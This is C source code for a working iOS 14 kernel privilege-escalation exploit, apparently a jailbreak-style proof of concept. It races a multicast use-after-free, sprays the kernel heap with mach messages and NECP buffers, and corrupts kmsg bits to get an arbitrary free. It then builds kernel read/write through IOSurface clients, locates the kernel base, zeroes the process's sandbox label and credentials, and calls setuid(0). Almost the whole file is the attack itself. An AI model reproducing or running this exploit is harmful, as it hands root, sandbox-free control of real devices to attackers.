#include "main.h"
#include "ENABLE_HELPER.h"

#include "iokit.h"
#include "IOSurfaceRoot.h"
#include "kernel_rw.h"
#include "mcast.h"
#include "necp.h"
#include "port_utils.h"
#include "spray.h"
#include "xpaci.h" // ptrauth.h replacement

#include <mach/mach.h>
#include <pthread.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#if ENABLE_HELPER
#include "helper/find_port.h"
#include "helper/proc.h"
#include "helper/tfp0_krw.h"
#include "helper/offsets.h"

extern uint64_t gKernelSlide, gKernelBase;
extern task_t tfp0;
#endif

#pragma clang diagnostic ignored "-Wdeprecated-declarations"
#define BYTECOPY_FIRST_TARGET KHEAP_DATA_MAPPABLE_LOC + 0x3F4C - BYTECOPY_OFFSET_IPV6   //0xffffffe4cf003f24
#define BYTECOPY_SECOND_TARGET (KHEAP_DATA_MAPPABLE_LOC + 0xFA4 + 0xB6 - BYTECOPY_OFFSET_IPV6) //0xffffffe4cf001032 // will copy over highest byte of kmsg's message bits, turning a non-complex kmsg to a complex one if its size ends in 0x80 (MACH_MSGH_BITS_COMPLEX)
#define BYTECOPY_OFFSET_IPV6 0x28
#define PORTS_COUNT 0x3A00
#define KMSG_SIZE 0x2F78 // the low 0x80 byte of this size will be copied to corrupt the message bits (setting 0x80000000, MACH_MSGH_BITS_COMPLEX)
#define UAF_BUFFER_KALLOC_1664_JOIN_COUNT 64 // UaF buffer ends up in default.kalloc.1664

#define IOSURFACE_SPRAY_UCS_COUNT 10

mach_port_t notif_port = MACH_PORT_NULL;
uint8_t *IOSurfaceClient_buf = NULL;
mach_port_t *kheap_data_ports = NULL;
int kheap_data_idx = -1;
int extra_frees_for_device = -1;
io_connect_t iogpu_connect = MACH_PORT_NULL;
io_connect_t iosurface_spray_ucs[IOSURFACE_SPRAY_UCS_COUNT];
uint32_t last_surf_id = 0;
uint64_t IOSurfaceRootUserClient_ptr = 0;

void spinning(void) {
    puts("Spinning here...");
    while(1) {};
}

mach_port_t get_arb_free_holder(void)
{
    int success = 0;
    
    // reliability voodoo
    for (int i = 0; i < 3; ++i)
    {
        mcast_increase_race_reliability();
        printf("Increase reliability...\n");
    }
    
    // more reliability voodoo
    pthread_attr_t pattr;
    pthread_attr_init(&pattr);
    pthread_attr_set_qos_class_np(&pattr, QOS_CLASS_USER_INITIATED, 0);
        
    // initialize refill buffer, putting the target for the bytecopy primitive there
    uint8_t *necp_buf = malloc(4096);
    *(uint64_t *)(necp_buf + 0x288) = BYTECOPY_FIRST_TARGET;

    printf("Start (will fail if device has not been rebooted since last run)\n");
    kheap_data_idx = -1;
    for (int iterations = 0; iterations < 255; ++iterations)
    {
        pthread_t pt1;
        pthread_t pt2;
        int s = socket(AF_INET6, SOCK_DGRAM, 0);
        int necp_fd = necp_open(0);
        
        mcast_race_sock = s;
        
        // grow the buffer on which the UaF will be triggered to default.kalloc.1664 and
        // put it at its max size before next realloc will occur
        int ip = 0;
        for (ip = 0; ip < UAF_BUFFER_KALLOC_1664_JOIN_COUNT-2; ++ip)
        {
            mcast_join_group(ip);
        }
        
        // trigger the UaF in default.kalloc.1664, perform bytecopy primitive if refill is successful
        pthread_create(&pt1, &pattr, (void *(*)(void *))mcast_join_group, (void *)(uint64_t)ip);
        pthread_create(&pt2, &pattr, (void *(*)(void *))mcast_join_group, (void *)(uint64_t)(ip + 1));
        
        // refill the UaF buffer in default.kalloc.1664 during the race
        for (int i = 0; i < 10; ++i)
        {
            spray_default_kalloc_necp(necp_fd, necp_buf, 0x318);
        }
        
        // synchronize
        pthread_join(pt1, NULL);
        pthread_join(pt2, NULL);
        
        // find out if the refill succeeded, in which case a corrupted trailer size will be returned
        // for the holder of the corrupted kmsg, which has also had its message bits corrupted
        // (0x80000000 - MACH_MSGH_BITS_COMPLEX - now set)
        {
            for (int i = 0; i < PORTS_COUNT; ++i)
            {
                int sz = port_peek_trailer_size(kheap_data_ports[i]);
                if (sz != 8)
                {
                    printf("kheap_data_idx : %d, sz = 0x%x\n", i, sz);
                    kheap_data_idx = i;
                    break;
                }
            }
            if (kheap_data_idx != -1)
            {
                success = 1;
                break;
            }
        }

        close(s);
    }
    
    if (!success)
    {
        printf("Failed! Run exploit only once per boot\n");
        printf("Make sure you are on iOS 14.2 - 14.8.1 and reboot to try again\n");
        exit(1);
    }
    
    free(necp_buf);
    
    return kheap_data_ports[kheap_data_idx];
}

int exploitation_init(void)
{
    kheap_data_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    mach_port_t *contained_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    mach_port_t *ool_ports = malloc(0x10000);
    uint8_t *kheap_data_spray_buf = malloc(0x4000);
    memset(kheap_data_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(contained_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(ool_ports, 0, 0x10000);
    memset(kheap_data_spray_buf, 0, 0x4000);
     
    // initialize the inline data
    // align a pointer here so that when the kmsg trailer size is corrupted, this pointer
    // will after that be followed and a second bytecopy performed where it points (kmsg message bits)
    *(uint64_t *)(kheap_data_spray_buf + 0x2F5C) = BYTECOPY_SECOND_TARGET;
    
    struct default_msg
    {
        mach_msg_header_t hdr;  //sizeof(mach_msg_header_t) = 0x20
        mach_msg_body_t body;   //sizeof(mach_msg_body_t) = 0x4
        mach_msg_port_descriptor_t desc_pad[9]; // TODO remove hack //sizeof(mach_msg_body_t) = 0x10; total size = 0x90;
        mach_msg_ool_ports_descriptor_t desc;   //sizeof(mach_msg_ool_ports_descriptor_t) = 0x10
    };
    
    struct default_msg *msg = (struct default_msg *)kheap_data_spray_buf;
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = KMSG_SIZE;

    msg->body.msgh_descriptor_count = 10; // TODO remove hack
    
    msg->desc.address = (void *)ool_ports;
    msg->desc.count = (0x10000-8)/8;
    msg->desc.deallocate = 0;
    msg->desc.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg->desc.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->desc.copy = MACH_MSG_VIRTUAL_COPY;
    
     
    // prepare all ports first
    for (int i = 0; i < PORTS_COUNT; ++i)
    {
        contained_ports[i] = port_new();
        kheap_data_ports[i] = port_new();
    }
    
    // spray fast
    for (unsigned int i = 0; i < PORTS_COUNT; ++i)
    {
       *ool_ports = contained_ports[i];
       msg->hdr.msgh_remote_port = kheap_data_ports[i];
       kern_return_t kr = mach_msg_send((mach_msg_header_t *)msg);
       /*
       
       mach_msg_send(msg) is same with:
       mach_msg(msg, MACH_SEND_MSG,
	           msg->msgh_size, 0, MACH_PORT_NULL,
	           MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
       
       */
       if (kr) {
           *(int *)1 = 0;
       }
    }

#if ENABLE_HELPER
    uint64_t kheap_data_ports0_kaddr = find_port(kheap_data_ports[0]);
    uint64_t contained_ports0_kaddr = find_port(contained_ports[0]);

    printf("kheap_data_ports[0]'s port_kaddr = 0x%llx\n", kheap_data_ports0_kaddr);
    printf("contained_ports[0]'s port_kaddr = 0x%llx\n", contained_ports0_kaddr);
    spinning();
#endif
        
    notif_port = port_new();
    for (int i = 0; i < PORTS_COUNT; ++i)
    {
        mach_port_t prev;
        mach_port_request_notification(mach_task_self(), contained_ports[i], MACH_NOTIFY_NO_SENDERS, 0, notif_port, MACH_MSG_TYPE_MAKE_SEND_ONCE, &prev);
        mach_port_deallocate(mach_task_self(), contained_ports[i]);
    }
    
    // pre-init kernel rw
    IOSurfaceClient_buf = calloc(1, 0x10000);
    kernel_rw_preinit(KHEAP_DATA_MAPPABLE_LOC - 0x4000 + 0x10, IOSurfaceClient_buf, 0x4000);
    
#if ENABLE_HELPER
    for (int i = 0; i < PORTS_COUNT; ++i) 
    {
        if(find_kmsgdata_from_port(kheap_data_ports[i]) == KHEAP_DATA_MAPPABLE_LOC) {
            uint64_t port_kaddr = find_port(kheap_data_ports[i]);
            printf("port_kaddr = 0x%llx\n", port_kaddr);

            uint32_t off_ipc_port_ikmq_base = 0x40;
            uint64_t ikmq_base = tfp0_kread64(port_kaddr + off_ipc_port_ikmq_base);
            // INFO("ikmq_base: 0x%llx\n", ikmq_base);
                
            uint32_t off_ipc_kmsg_ikm_header = 0x20; // p/x offsetof(ipc_kmsg, ikm_header)
            uint64_t ikm_header = tfp0_kread64(ikmq_base+off_ipc_kmsg_ikm_header);

            tfp0_khexdump(ikm_header, 0x400);
            tfp0_khexdump(ikmq_base, 0x400);
            break;
        }
    }

    tfp0_khexdump(KHEAP_DATA_MAPPABLE_LOC, 0x4000);
/*
    tfp0_khexdump(KHEAP_DATA_MAPPABLE_LOC, 0x4000);

    [0xffffffe4cf000000+0x000] EF BE AD DE EF BE AD DE  00 00 00 00 00 00 00 00  |  ................ 
    [0xffffffe4cf000000+0x010] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
    ...
    [0xffffffe4cf000000+0xf90] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
    [0xffffffe4cf000000+0xfa0] 00 00 00 00 11 00 00 80  A4 2F 00 00 70 E3 03 A0  |  ........./..p... 
    [0xffffffe4cf000000+0xfb0] E1 FF FF FF 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
    [0xffffffe4cf000000+0xfc0] 00 00 00 00 0A 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
    [0xffffffe4cf000000+0xfd0] 70 E3 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  p............... 
    [0xffffffe4cf000000+0xfe0] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
    ...
    [0xffffffe4cf000000+0x1040] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
    [0xffffffe4cf000000+0x1050] 00 00 00 00 00 00 00 00  00 C0 91 BE E8 FF FF FF  |  ................ 
    [0xffffffe4cf000000+0x1060] 00 01 11 02 FF 1F 00 00  00 00 00 00 00 00 00 00  |  ................ 
    [0xffffffe4cf000000+0x1070] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
    ...
    [0xffffffe4cf000000+0x3f10] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
    [0xffffffe4cf000000+0x3f20] 00 00 00 00 00 00 00 00  00 00 00 00 32 10 00 CF  |  ............2...   ( ..... part of BYTECOPY_SECOND_TARGET; written at (BYTECOPY_FIRST_TARGET+0x3f2C(=BYTECOPY_FIRST_TARGET+8))
    [0xffffffe4cf000000+0x3f30] E4 FF FF FF 00 00 00 00  00 00 00 00 00 00 00 00  |  ................   ( part of BYTECOPY_SECOND_TARGET ..... ) BYTECOPY_SECOND_TARGET=0xffffffe4cf001032
    [0xffffffe4cf000000+0x3f40] 00 00 00 00 00 00 00 00  00 00 00 00 08 00 00 00  |  ................ 
    [0xffffffe4cf000000+0x3f50] 00 00 00 00 00 00 00 00  00 00 00 00 FF FF FF FF  |  ................ 
    [0xffffffe4cf000000+0x3f60] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
    [0xffffffe4cf000000+0x3f70] 9E 01 00 00 00 00 00 00  DF 03 00 00 00 00 00 00  |  ................ 
    [0xffffffe4cf000000+0x3f80] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
    ...
    [0xffffffe4cf000000+0x3fe0] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
    [0xffffffe4cf000000+0x3ff0] 00 00 00 00 00 00 00 00  EF BE AD DE EF BE AD DE  |  ................ 
*/

/*
    uint64_t kptr = tfp0_kread64(BYTECOPY_FIRST_TARGET+8); // = tfp0_kread64(BYTECOPY_FIRST_TARGET+0x3F2C)
    printf("kptr: 0x%llx\n", kptr); // kptr = 0xffffffe4cf001032 = BYTECOPY_SECOND_TARGET
*/
#endif

    free(contained_ports);
    free(ool_ports);
    free(kheap_data_spray_buf);

    // spinning();
    
    return 0;
}

int exploitation_get_krw_with_arb_free(mach_port_t arb_free_holder, uint64_t *kernel_base)
{
    int fildes[2];
    pipe(fildes);
    int read_pipe = fildes[0];
    int write_pipe = fildes[1];
    
    pipe(fildes);
    int read_pipe2 = fildes[0];
    int write_pipe2 = fildes[1];
    
    uint8_t null_buf[0x10000] = {0};
    uint8_t msg_buf[0x10000] = {0};
    uint8_t buf41[0x10000] = {0};
    memset(buf41, 0x41, 0x10000);
    
    // alloc these before array of IOSurfaceClients becomes 0x10000
    mach_port_t iosurface_spray_ucs[IOSURFACE_SPRAY_UCS_COUNT];
    for (int i = 0; i < IOSURFACE_SPRAY_UCS_COUNT; ++i)
    {
        iosurface_spray_ucs[i] = IOSurfaceRoot_init();
    }
    
    // cause max size of arrays of IOSurfaceClients to become 0x10000
    uint32_t last_id = IOSurfaceRoot_cause_array_size_to_be_0x10000();
    
    // TODO fill 0x10000 gaps here
    
    // trigger arbitrary free in kheap default
    port_destroy(arb_free_holder);
    
    write(write_pipe2, null_buf, 0x10000-1);
    
    printf("Past first refill\n");
  
    // find allocation at KHEAP_DEFAULT_MAPPABLE_LOC
    int orig_holder_idx = -1;
    for (uint32_t i = PORTS_COUNT-1;
         (i > 0) && port_has_msg(notif_port);
         --i)
    {
        // skip already free'd index and its adjacent locs which we'll use later
        if (i == kheap_data_idx || i == kheap_data_idx - 1 || i == kheap_data_idx - 2)
        {
            continue;
        }
        
        port_receive_msg(notif_port, msg_buf, sizeof(msg_buf));
       
        port_destroy(kheap_data_ports[i]);

        orig_holder_idx = i;
    }
    
    for (int i = 0; i < IOSURFACE_SPRAY_UCS_COUNT; ++i)
    {
        IOSurfaceRoot_lookup_surface(iosurface_spray_ucs[i], last_id);;
    }
    printf("orig_holder_idx %d/%d, last_id, 0x%08X\n", orig_holder_idx, PORTS_COUNT, last_id);
    
    // read out IOSurfaceClient
    read(read_pipe2, msg_buf, 0x10000-1);
    uint64_t *src = (uint64_t *)msg_buf;
    uint64_t IOSurfaceClient_ptr = src[last_id];
    printf("IOSurfaceClient ptr: %p\n", (void *)IOSurfaceClient_ptr);
    
    // point a fake IOSurfaceClient to kheap data
    uint64_t redirect[0x100];
    for (int i = 0; i < 0x100; ++i)
        redirect[i] = KHEAP_DATA_MAPPABLE_LOC - 0x4000 + 0x10;
    write(write_pipe2, redirect, 0x10000-1);
    
    // refill in kheap data
    port_destroy(kheap_data_ports[kheap_data_idx-1]);
    kheap_data_ports[kheap_data_idx-1] = MACH_PORT_NULL;
    write(write_pipe, IOSurfaceClient_buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);

    // find krw
    printf("Find krw...\n");

    int found = 0;
    io_connect_t iosurface_connect_krw = 0;
    for (int i = 0; i < IOSURFACE_SPRAY_UCS_COUNT; ++i)
    {
        iosurface_connect_krw = iosurface_spray_ucs[i];
        
        kernel_rw_init(iosurface_connect_krw, 2, read_pipe, write_pipe);
        uint32_t orig = kread32(KHEAP_DATA_MAPPABLE_LOC - 0x8000);
        kwrite32(KHEAP_DATA_MAPPABLE_LOC - 0x8000, 0xFEED);
        uint32_t result = kread32(KHEAP_DATA_MAPPABLE_LOC - 0x8000);
        kwrite32(KHEAP_DATA_MAPPABLE_LOC - 0x8000, orig);
        if (result == 0xFEED)
        {
            printf("Test kwrite32 and kread32: %08X (should be 0000FEED) at %d\n", result, i);
            found = 1;
            break;
        }
    }
    if (!found)
    {
        printf("Failed! Reboot to try again (remember to only run once per boot)\n");
        exit(1);
    }

    printf("Get kernel base...\n");
    
    uint64_t vtable = xpaci(kread64(IOSurfaceClient_ptr));
    printf("IOSurfaceClient vtable: %p\n", (void *)vtable);
    
    // find kernel base
    uint64_t pos = (vtable & ~0x3FFF);
    do
    {
        pos -= 0x4000;
    } while (kread32(pos) != 0xFEEDFACF);
    *kernel_base = pos;
    printf("Got kernel base: %p\n", (void *)*kernel_base);

    do {
        uint64_t surface = kread64(IOSurfaceClient_ptr + 0x40);
        if (surface) {
            uint64_t task = xpaci(kread64(surface + 0x70));
            if (!task) break;
            // TODO This offset changes throughout iOS 14...
            // 14.5 beta 2 and above: 0x3B0 on arm64e, 0x398 on arm64
            // 14.5 beta 1 and below: 0x3A0 on arm64e, 0x390 on arm64
            uint64_t proc = xpaci(kread64(task + 0x3B0));
            if (!proc) break;
            uint64_t ucred = xpaci(kread64(proc + 0xF0));
            if (!ucred) break;
            uint64_t label = xpaci(kread64(ucred + 0x78));
            if (!label) break;
            printf("Our task: 0x%llX\n", task);
            printf("Our proc: 0x%llX\n", proc);
            printf("Our ucred: 0x%llX\n", ucred);
            printf("Our label: 0x%llX\n", label);
            
            kwrite64(label + (2 * sizeof(uint64_t)), 0);
            kwrite32(ucred + 0x20, 0);
            
            setuid(0); 
            setuid(0);
            
            if (getuid()) {
                printf("Failed to escalate to root\n");
                break;
            }
            printf("getuid() -> 0\n");
            printf("Escalated to root and unsandboxed\n");
        }
    } while (0);

    // Prevent panic on exit
     IOSurfaceRootUserClient_ptr = xpaci(kread64(IOSurfaceClient_ptr + 0x10));
    printf("IOSurfaceRootUserClient_ptr: %p\n", (void *)IOSurfaceRootUserClient_ptr);
    uint32_t refs = kread32(IOSurfaceRootUserClient_ptr + 8);
    kwrite32(IOSurfaceRootUserClient_ptr + 8, refs + 1); // leak a ref, so that we won't panic on exit;
    
    setuid(501); // Fix Xcode not being able to kill the app
    
    // TODO cleanup any other no longer needed IOSurface resources here
    
    return 0;
}

void exploitation_cleanup(void)
{
    
}

int exploit_get_krw_and_kernel_base(uint64_t *kernel_base)
{
    uint64_t _kernel_base = 0;
    
    // generic exploitation init
    if (exploitation_init() != 0)
    {
        return 1;
    }
    
    // trigger bug, get arbitrary free
    mach_port_t arb_free_holder = get_arb_free_holder();

#if ENABLE_HELPER
    //About arb_free_holder, what address will be allocated and what data inside?
    uint64_t kmsgdata_addr = find_kmsgdata_from_port(arb_free_holder);  //KHEAP_DATA_MAPPABLE_LOC = 0xffffffe4cf000000
    tfp0_khexdump(kmsgdata_addr, 0x4000);
    spinning();
#endif
    
    // generic exploitation using arbitrary free
    exploitation_get_krw_with_arb_free(arb_free_holder, &_kernel_base);
    
    // generic exploitation cleanup (kernel r/w still active)
    exploitation_cleanup();
    
    *kernel_base = _kernel_base;
    
    return 0;
}

int main(void)
{
#if ENABLE_HELPER
    tfp0_init();
    tfp0_get_kernel_base();
    offsets_init();
    printf("tfp0 = 0x%x\n", tfp0);
    printf("gKernelBase = 0x%llx, gKernelSlide = 0x%llx\n", gKernelBase, gKernelSlide);
#endif
    uint64_t kernel_base = 0;
    
    if (exploit_get_krw_and_kernel_base(&kernel_base) != 0)
    {
        printf("Exploit failed!\n");
        return 1;
    }
    
    // test kernel r/w, read kernel base
    uint32_t mh_magic = kread32(kernel_base);
    if (mh_magic != 0xFEEDFACF)
    {
        printf("mh_magic != 0xFEEDFACF: %08X\n", mh_magic);
        return 1;
    }
    
    printf("kread32(_kernel_base) success: %08X\n", mh_magic);
    
    printf("Done\n");
    
    return 0;
}
